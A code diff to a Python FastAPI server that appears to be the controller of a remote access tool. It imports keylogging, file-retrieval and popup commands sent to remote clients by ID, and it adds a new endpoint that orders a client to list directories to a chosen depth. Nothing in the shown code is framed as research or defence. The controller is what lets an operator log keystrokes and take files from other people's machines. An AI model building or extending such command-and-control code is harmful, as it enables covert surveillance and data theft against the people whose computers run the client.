@@ -1,12 +1,13 @@
 import argparse
 from pathlib import Path
+from typing import Optional
 
 import uvicorn
 from fastapi import FastAPI
 
 import configurator
 from commands import PopupCommand, PopupParameters, BasicCommand, CommandType, KeyLogCommand, KeyLogParameters, \
-    GetFileCommand, GetFileParameters
+    GetFileCommand, GetFileParameters, DirListCommand, DirListParameters
 from protocol.requests import RequestHeader, RequestType, SendCommandRequest, SendCommandContent
 from protocol.responses import BasicResponse, SendCommandResponse
 
@@ -112,6 +113,20 @@ def send_getfile_command(client_id: str, path: str) -> BasicResponse:
                 request_type=RequestType.SendCommand
             ),
             content=SendCommandContent(command=GetFileCommand(parameters=GetFileParameters(path=path)))
+        )
+    )
+
+
+@app.get("/dirlist")
+def send_dirlist_command(client_id: str, path: str, depth: Optional[int]) -> BasicResponse:
+    return make_command_request(
+        SendCommandRequest(
+            header=RequestHeader(
+                client_id=client_id,
+                request_type=RequestType.SendCommand
+            ),
+            content=SendCommandContent(command=DirListCommand(parameters=DirListParameters(path=path,
+                                                                                           depth=depth)))
         )
     )
 
